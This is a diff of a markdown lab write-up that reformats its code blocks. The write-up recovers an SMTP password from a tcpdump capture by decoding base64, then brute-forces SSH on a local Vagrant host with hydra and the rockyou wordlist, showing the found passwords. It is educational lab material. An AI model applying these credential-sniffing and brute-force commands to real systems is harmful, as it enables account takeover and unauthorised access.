@@ -17,15 +17,19 @@ On the other terminal, run the `user_authenticating_into_server` script
 
 Once the script is done, you can manually exit (Ctrl+C) on the terminal 0.
 
-`-$ tcpdump -A -X -r dump.pcap > file.txt`
+``` bash
+-$ tcpdump -A -X -r dump.pcap > file.txt
+```
 
-`-$ grep "=ZB" file.txt`
-`
+```
+-$ grep "=ZB" file.txt
+```
+```
     =ZB.....
     =ZB.....334 UGFzc3dvcmQ6
     ...N=ZB.
     ....=ZB.bXlwYXNzd29yZDk4OTgh
-`
+```
 the password is `bXlwYXNzd29yZDk4OTgh` base64
 and convert to base64 to text `mypassword9898!`
 
@@ -58,7 +62,7 @@ I would be making use of the [rockyou](https://github.com/brannondorsey/naive-ha
 ``` bash
 -$ sudo hydra -l sylvain -P /vagrant/rockyou.txt ssh://127.0.0.1:2222 -t 4
 ```
-`
+```
 Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
 
 Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2023-09-21 09:09:20
@@ -67,5 +71,5 @@ Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2023-09-21 09:09:
 [2222][ssh] host: 127.0.0.1   login: sylvain   password: password123
 1 of 1 target successfully completed, 1 valid password found
 Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2023-09-21 09:09:23
-`
+```
 and the password is found `password123`
